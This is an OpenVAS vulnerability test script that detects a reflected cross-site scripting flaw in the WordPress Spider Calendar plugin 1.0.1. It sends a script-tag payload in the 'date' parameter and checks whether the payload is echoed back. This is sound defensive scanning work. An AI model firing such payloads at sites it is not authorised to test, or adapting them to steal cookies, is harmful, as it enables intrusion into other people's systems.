###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_spider_calendar_plugin_xss_vuln.nasl 5940 2017-04-12 09:02:05Z teissa $
#
# WordPress Spider Calendar Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to execute arbitrary
HTML and script code in a user's browser session in the context of an affected site.

Impact Level: Application";

tag_affected = "WordPress Spider Calendar Plugin version 1.0.1";

tag_insight = "Input passed via the 'date' parameter to 'front_end/spidercalendarbig.php'
is not properly sanitised before being returned to the user.";

tag_solution = "Update to version 1.1.3 or later,
For updates refer to http://wordpress.org/extend/plugins/spider-calendar";

tag_summary = "This host is running WordPress Spider Calendar Plugin and is
prone to cross site scripting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802998";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5940 $");
  script_bugtraq_id(55779);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-12 11:02:05 +0200 (Wed, 12 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-10-18 11:07:20 +0530 (Thu, 18 Oct 2012)");
  script_name("WordPress Spider Calendar Plugin Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50812");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/79042");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/21715/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117078/WordPress-Spider-1.0.1-SQL-Injection-XSS.html");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
url = "";
dir = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Iterate over plugins dir
plugins = make_list("spider-calendar", "calendar");

foreach plugin (plugins)
{
  ## Construct xss attack
  url = dir + '/wp-content/plugins/' + plugin + '/front_end/' +
        'spidercalendarbig.php?calendar_id=1&cur_page_url=&date=' +
        '"><script>alert(document.cookie)</script>';

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
                     pattern:"<script>alert\(document.cookie\)</script>"))
  {
    security_message(port:port);
    exit(0);
  }
}
